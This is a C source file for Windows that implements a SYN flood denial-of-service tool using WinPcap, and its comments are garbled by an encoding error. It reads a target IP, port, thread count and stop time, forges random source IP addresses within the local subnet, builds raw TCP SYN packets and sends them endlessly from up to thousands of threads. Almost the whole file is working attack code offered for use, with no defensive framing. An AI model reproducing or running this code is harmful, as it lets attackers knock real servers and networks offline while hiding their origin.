#include "synpacket.h" 

//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )		  // ������ڵ�ַ ����ִ��

int main(int argc,char* argv[])
{ 
	unsigned long ip = 0;					//IP��ַ 
	//step0: ����������ӣ�αװ���IP��PORT
	srand((unsigned)time(0));
	//step1 : �������
	getInput(argc,argv);
	//step2 : MAC ����
	getMASKMAC();			//MAC��ַ��ȡ��α��
	//step3 : ������ȡ
	getNetworkCard();
	//step4 ��������  
	/*�ƶ�ָ�뵽�û�ѡ������� */ 

	//for(d=alldevs, cards=0; cards< inum-1 ;d=d->next, cards++); 

	//step5: �����ⲿ����
	printf("\n--------------------------------\n");
	printf("%d ��ֹͣ\n",stopTime);
	creatSleep();
	printf("\n--------------------------------\n");

	d=alldevs;
	for(int  j=0; j< cards ;d=d->next, j++)
	{
		char *rst = NULL;
		char *rst2 = NULL;
		char *rst3 = NULL;
		char *rst4 = NULL;
		rst   = strstr(d->description,"VMware");
		rst2 = strstr(d->description,"Virtual");
		rst3 = strstr(d->description,"VPN");
		rst4 = strstr(d->description,"Tunnel");
		//�ַ�������
		if ( ( rst>0) || (rst2>0) || (rst3 >0) || (rst4 >0))
		{
			continue;
		}
		//α��MAC��ַ
		paraforthread.srcmac = GetSelfMac(d->name+8); //+8��ȥ��"rpcap://"  
		printf("IP %s\n",d->addresses->addr->sa_data);
		printf("\n\t[!debug]Դmac %s\n",paraforthread.srcmac);
		printf("[choice card]%s\n",d->description);
		if ( (paraforthread.adhandle= pcap_open(d->name,		// name of the device 
			65536,																		// portion of the packet to capture 
			0,																				//open flag 
			1000,																		// read timeout 
			NULL,																		// authentication on the remote machine 
			errbuf																		// error buffer 
			) ) == NULL) 
		{ 
			fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name); 
			/* Free the device list */ 
			pcap_freealldevs(alldevs); 
			return -1; 
		} 
		//step6 �� �����߳�
		for(pAddr=d->addresses; pAddr; pAddr=pAddr->next)
		{ 
			//�õ��û�ѡ���������һ��IP��ַ 
			pAddr=d->addresses;
			ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr; 

			//�������߳�
			for (int i=0;i<MAXTHREAD;i++)
			{   
				threadhandle[i]=CreateThread(NULL,
					0,
					SynfloodThread, 
					(void *)&paraforthread, 
					0, 
					NULL );
				if(!threadhandle)
				{
					printf("CreateThread error: %d\n",GetLastError());
				}
				Sleep(100);			
			}

		} 
		DWORD dwWaitResult=WaitForMultipleObjects(
			MAXTHREAD,             // number of handles in the handle array
			threadhandle,  // pointer to the object-handle array
			TRUE,            // wait flag
			INFINITE     // time-out interval in milliseconds
			);
		switch (dwWaitResult)
		{
		case WAIT_OBJECT_0:
			printf ("\nAll thread exit\n");
			break;
		default:
			printf("\nWait error: %u",GetLastError());
		}

	}
	
	return 0; 
} 
/** 
* ���������MAC��ַ 
* pDevName �������豸���� 
*/ 
unsigned char* GetSelfMac(char* pDevName){ 
	
	static u_char mac[6]; 
	
	memset(mac,0,sizeof(mac)); 
	
	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName); 
	
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE)) 
	{ 
		return NULL; 
	} 
	
	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA)); 
	if (OidData == NULL) 
	{ 
		PacketCloseAdapter(lpAdapter); 
		return NULL; 
	} 
	// 
	// Retrieve the adapter MAC querying the NIC driver 
	// 
	OidData->Oid = OID_802_3_CURRENT_ADDRESS; 
	
	OidData->Length = 6; 
	memset(OidData->Data, 0, 6); 
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData); 
	if(Status) 
	{ 
		memcpy(mac,(u_char*)(OidData->Data),6); 
	} 
	free(OidData); 
	PacketCloseAdapter(lpAdapter); 
	return mac; 
	
} 

/** 
* ��װARP����� 
* source_mac ԴMAC��ַ 
* srcIP ԴIP 
* destIP Ŀ��IP 
*/ 
unsigned char* BuildSYNPacket(unsigned char* source_mac, unsigned char* dest_mac,unsigned long srcIp, unsigned long destIp,unsigned short dstPort)					  
{  
	PSD_HEADER PsdHeader;
	//BYTE Buffer[46]={0};
	BYTE Buffer[74]={0};
	
	srcIp = htonl(ntohl(FakedIP) + rand()%ips);  //α�챾����IP��ַ
	while(INADDR_NONE==srcIp)
	{ 
		
		
		srcIp = htonl(ntohl(FakedIP) + rand()%ips); 
	} 
	/****************           ������̫��ͷ��         *************************/
	//Ŀ��MAC��ַ
	memcpy(packet.eth.eh_dst,dest_mac,6); 
	//ԴMAC��ַ 
	memcpy(packet.eth.eh_src,source_mac,6); 
	//�ϲ�Э��ΪARPЭ�飬0x0806 
	packet.eth.eh_type = htons(0x0800); 
	/*******************          ����IPͷ        *********************/
    packet.iph.h_verlen =0;
	//packet.iph.h_verlen = ((4<<4)| sizeof(IP_HEADER)/sizeof(unsigned int));
	//�ײ��Ż�
	packet.iph.h_verlen = 0x45;		//4 ��ʾIPV4 �� 5��ʾ �ײ�ռ 32bit�ֵ���Ŀ
    packet.iph.tos = 0;
    packet.iph.total_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
    packet.iph.ident = CNT++;	//1		//��ʾ������Ҫ�޸�
    packet.iph.frag_and_flags =htons(1<<14) ;
    packet.iph.ttl = 64;		
    packet.iph.proto = IPPROTO_TCP;
    packet.iph.checksum = 0;			//��ʼʱУ���Ϊ0
    packet.iph.sourceIP =  srcIp ;
    packet.iph.destIP = destIp ;
	/********************          ����TCPͷ      **********************/
    packet.tcph.th_sport = htons( rand()%60000 + 1024 );
    packet.tcph.th_dport = htons(dstPort);
    packet.tcph.th_seq = htonl( rand()%900000000 + 100000 );
    packet.tcph.th_ack = 0;
	packet.tcph.th_data_flag=0;
	packet.tcph.th_data_flag=(11<<4|2<<8);
    packet.tcph.th_win = htons(8192);
    packet.tcph.th_sum = 0;
    packet.tcph.th_urp = 0;
	packet.tcph.option[0]=htonl(0X020405B4);
	packet.tcph.option[1]=htonl(0x01030303);
	packet.tcph.option[2]=htonl(0x0101080A);
	packet.tcph.option[3]=htonl(0x00000000);
	packet.tcph.option[4]=htonl(0X00000000);
    packet.tcph.option[5]=htonl(0X01010402);
	/********************         �������    *************************/
	//memset(packet.filldata,0,6);
	/******************           ����αͷ��     ************************/
    PsdHeader.saddr = srcIp;
    PsdHeader.daddr = packet.iph.destIP;
    PsdHeader.mbz = 0;
    PsdHeader.ptcl = IPPROTO_TCP;
    PsdHeader.tcpl = htons(sizeof(TCP_HEADER));
    memcpy( Buffer, &PsdHeader, sizeof(PsdHeader) );
    memcpy( Buffer + sizeof(PsdHeader), &packet.tcph, sizeof(TCP_HEADER) );
    packet.tcph.th_sum = CheckSum( (unsigned short *)Buffer, sizeof(PsdHeader) 
		+ sizeof(TCP_HEADER));
	
    memset( Buffer, 0, sizeof(Buffer) );
    memcpy( Buffer, &packet.iph, sizeof(IP_HEADER) );
    packet.iph.checksum = CheckSum( (unsigned short *)Buffer, sizeof(IP_HEADER) );

	return (unsigned char*)&packet; 
} 


//����У���
unsigned short CheckSum(unsigned short * buffer, int size)
{
    unsigned long   cksum = 0;
	
    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size)
    {
        cksum += *(unsigned char *) buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
	
    return (unsigned short) (~cksum);
}

//�����̺߳���
DWORD WINAPI SynfloodThread(LPVOID lp)
{   
//	SYSTEMTIME seedval;
	PARAMETERS paragmeters;
	paragmeters=*((LPPARAMETERS)lp);
	paragmeters.sourceIP = htonl(12345);
	Sleep(10);

	unsigned char * packet;
	while(true)
	{   
			 //GetLocalTime( &seedval );  // address of system time structure
			 //srand( (unsigned int)seedval.wSecond+(unsigned int)seedval.wMilliseconds );
			 packet = BuildSYNPacket(paragmeters.srcmac, paragmeters.dstmac,
				 paragmeters.sourceIP,paragmeters.destIP,paragmeters.destPort);
			 if(pcap_sendpacket(paragmeters.adhandle,packet, 78)==-1)
			 { 
				 fprintf(stderr,"pcap_sendpacket error.\n"); 
			 } 
			 else
			 {
				 sum ++ ;
				 printf("\b\b\b\b\b\b\b\b\b %i",sum);
			 }

			 if (stopFlag == true)
			 {
				 printf("end\n");
				 return 0;		//�˳��߳�
			 }
	}
	return 1;
}

void getMASKMAC()				//��ȡ����MAC
{
	//MAC���
	//������ܵ�MAC���Ա����Ŀ�Ķ˿�
	char *p_Dev_name=G_device_name+strlen(G_device_name);

	if(GetLocalAdapter(p_Dev_name,(unsigned char *)G_device_mac,
		G_device_ip,G_device_netmask,G_gateway_ip)==FALSE)
	{
		printf("GetLocalAdapter ERROR!\n");
		exit(-1);
	}

	if(GetMacByArp(G_gateway_ip,(unsigned char*)G_dst_mac,6)==FALSE)		
	{ 
		printf("ERROR! GetMacByArp %s\n",iptos(G_gateway_ip));
		memset(G_dst_mac,0xff,6);
	}

	//�˴��滻������MAC

	paraforthread.dstmac[0]=G_dst_mac[0] & 0xff; 
	paraforthread.dstmac[1]=G_dst_mac[1] & 0xff;
	paraforthread.dstmac[2]=G_dst_mac[2] & 0xff;
	paraforthread.dstmac[3]=G_dst_mac[3] & 0xff;
	paraforthread.dstmac[4]=G_dst_mac[4] & 0xff;
	paraforthread.dstmac[5]=G_dst_mac[5] & 0xff;

	printf("\n\t[!debug]Ŀ��mac %x:%x:%x:%x:%x:%x\n",paraforthread.dstmac[0],paraforthread.dstmac[1],
		paraforthread.dstmac[2],paraforthread.dstmac[3],paraforthread.dstmac[4],paraforthread.dstmac[5]);
		//��ӡIP��Ϣ
	struct in_addr addrTest;
	addrTest.S_un.S_addr = G_gateway_ip;
	printf("\n\t[!debug]����IP %s\n",inet_ntoa(addrTest));
	addrTest.S_un.S_addr = G_device_netmask;
	printf("\n\t[!debug]�������� %s\n",inet_ntoa(addrTest));
	addrTest.S_un.S_addr = G_device_ip;
	printf("\n\t[!debug]����IP %s\n",inet_ntoa(addrTest));
	//���������
	FakedIP = G_device_netmask & G_device_ip;
	ips = ((unsigned long)inet_addr(maskBase)) - ntohl(G_device_netmask);
	addrTest.S_un.S_addr = FakedIP;
	printf("\n\t[!debug]IP���� (%d) ->base IP : %s\n",ips,inet_ntoa(addrTest));
}

void getNetworkCard()
{
	/* ��ñ��������б� */ 
	if (pcap_findalldevs_ex((char*)PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) 
	{ 
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf); 
		exit(1); 
	} 
	/* ��ӡ�����б� */ 
	for(d=alldevs; d; d=d->next) 
	{ 
		printf("%d", ++cards); 
		if (d->description) 
			printf(". %s\n", d->description); 
		else 
			printf(". No description available\n"); 
	} 
	//���û�з������� 
	if(cards==0) 
	{ 
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n"); 
		exit(-1); 
	} 
}

void getInput(int argc,char *argv[])
{
	unsigned long  destIp = 0;						//Ŀ��IP
	unsigned short dstPort;					//Ŀ�Ķ˿�
	char attrackIP[100];

	int attrackPORT = destToPort ,attrackThread = MAXTHREAD;

	if( 5==argc || 4 == argc || 3== argc || 2== argc)
	{ 
		printf("you input destIp dstPort  threads  %s \n",argv[0]);
		//���������в���ָ��
		strcpy(attrackIP, argv[1]);
		if(2 == argc)
		{
			attrackPORT = 139;									//Ĭ��139�˿�
			attrackThread = 6000;								//Ĭ�Ͽ���6000���߳�
		}else if (3==argc)
		{
			attrackPORT = atoi(argv[2]);						//Ŀ�Ķ˿�
			attrackThread = 6000;								//Ĭ�Ͽ���6000���߳�
		}
		else if(4 == argc)
		{
			attrackPORT = atoi(argv[2]);						//Ŀ�Ķ˿�
			attrackThread = atoi(argv[3]);					//�߳���
		}
		else
		{
			attrackPORT = atoi(argv[2]);						//Ŀ�Ķ˿�
			attrackThread = atoi(argv[3]);					//�߳���
			stopTime =(atoi(argv[4]) + 10) *SECOND;	
		}
	} 
	else
	{
		//û���ڳ������������IP PORT threads
		printf("attrack (ip) (port) (threads) (stopTime):");
		scanf("%s%d%d%d",attrackIP,&attrackPORT,&attrackThread,&stopTime);  
	}

	//д�����������У��
	destIp=inet_addr(attrackIP);
	if(INADDR_NONE==destIp)
	{ 
		fprintf(stderr,"Invalid IP: %s\n",destIPAddr); 
		exit(-1); 
	} 
	//Ŀ�Ķ˿�
	dstPort = attrackPORT;
	if(dstPort<1 || dstPort>65535)
	{
		dstPort = destToPort;			//��Խ����Զ���λ
	}

	//����̵߳Ĳ�����
	paraforthread.destIP=destIp;
	paraforthread.destPort=dstPort;
	MAXTHREAD = attrackThread;

	//�̲߳���
	threadhandle = (HANDLE *) malloc(sizeof(HANDLE) * MAXTHREAD);
	if(NULL == threadhandle )
	{
		threadhandle = (HANDLE *) malloc(sizeof(HANDLE) * 6000);		//�˴���Ҫ�޸�
	}
}

void creatSleep()
{
	stopFlag = false;
	sleepthreadhandle =  (HANDLE *) malloc(sizeof(HANDLE));
	//�������߳�
	*sleepthreadhandle = CreateThread(NULL,0,SleepThread, (void *)&paraforthread, 0, NULL );
	if(!sleepthreadhandle)
	{
			printf("CreateSleepThread error: %d\n",GetLastError());
	}
	Sleep(100);			
}

DWORD WINAPI SleepThread(LPVOID lp)			//sleep �̵߳��ú���
{
	printf("\t\t\t stop time thread start %d\n",stopTime);
	Sleep(stopTime);
	printf("\t\t\t stop time thread end \n");	
	stopFlag = true;
	exit(1);
	return 1;
}